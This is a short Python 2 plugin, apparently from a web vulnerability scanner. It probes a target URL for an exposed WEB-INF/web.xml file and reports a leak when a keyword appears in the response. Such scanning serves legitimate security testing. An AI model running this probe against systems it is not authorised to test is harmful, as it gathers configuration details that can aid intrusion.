# -*- coding: utf-8 -*-
import requests
from plugin.util import urlhandler
from lib.core.settings import HEADERS, TIMEOUT, VERIFY, RETRY_CNT
from data.info_dict import WEBXML_KEYWORD

requests.packages.urllib3.disable_warnings()

def poc(url):
    testurl = urlhandler(url)
    payload = testurl + "WEB-INF/web.xml"

    try_cnt = 0
    while True:
        try:
            r = requests.get(payload, headers=HEADERS, timeout=TIMEOUT,
                             verify=VERIFY)
            if WEBXML_KEYWORD in r.content:
                return '[WebXml_Leak] %s' % payload
            break
        except Exception, e:
            try_cnt += 1
            if try_cnt >= RETRY_CNT:
                return  # '[RequestErr-WebXml_Leak] %s' % payload
